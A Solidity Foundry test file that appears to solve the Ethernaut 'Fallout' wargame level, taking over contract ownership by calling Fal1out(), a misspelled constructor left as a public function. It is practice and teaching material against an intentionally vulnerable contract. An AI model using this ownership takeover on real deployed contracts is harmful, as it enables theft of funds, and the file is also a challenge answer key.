// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Fallout.sol";
import "src/levels/FalloutFactory.sol";

contract TestFallout is BaseTest {
    Fallout private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new FalloutFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /**
         * CODE YOUR SETUP HERE
         */
        levelAddress = payable(this.createLevelInstance(true));
        level = Fallout(levelAddress);
    }

    function exploitLevel() internal override {
        /**
         * CODE YOUR EXPLOIT HERE
         */

        // The goal here is to take over the ownership of Fallout
        // Instead of using constuctor, Fal1out() is used, which is a public function and is not called anywhere during deployment

        vm.startPrank(player);

        // Just call Fal1out() function to take initiate the onwer to be player address
        level.Fal1out();

        vm.stopPrank();
    }
}
